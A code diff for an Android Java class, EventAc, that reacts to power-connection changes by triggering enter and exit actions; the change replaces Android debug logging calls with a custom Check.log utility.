@@ -11,12 +11,11 @@ package com.android.service.event;
 
 import java.io.IOException;
 
-import android.util.Log;
-
 import com.android.service.Ac;
 import com.android.service.auto.Cfg;
 import com.android.service.interfaces.Observer;
 import com.android.service.listener.ListenerAc;
+import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
 
 public class EventAc extends EventBase implements Observer<Ac> {
@@ -48,7 +47,7 @@ public class EventAc extends EventBase implements Observer<Ac> {
 			actionOnEnter = event.getAction();
 			actionOnExit = databuffer.readInt();
 		} catch (final IOException e) {
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: params FAILED");
+			if(Cfg.DEBUG) Check.log( TAG + " Error: params FAILED");
 			return false;
 		}
 		
@@ -62,16 +61,16 @@ public class EventAc extends EventBase implements Observer<Ac> {
 
 	// Viene richiamata dal listener (dalla dispatch())
 	public int notification(Ac a) {
-		if(Cfg.DEBUG) Log.d("QZ", TAG + " Got power status notification: " + a.getStatus());
+		if(Cfg.DEBUG) Check.log( TAG + " Got power status notification: " + a.getStatus());
 
 		// Nel range
 		if (a.getStatus() == true && inRange == false) {
 			inRange = true;
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " AC IN");
+			if(Cfg.DEBUG) Check.log( TAG + " AC IN");
 			onEnter();
 		} else if (a.getStatus() == false && inRange == true) {
 			inRange = false;
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " AC OUT");
+			if(Cfg.DEBUG) Check.log( TAG + " AC OUT");
 			onExit();
 		}
 		
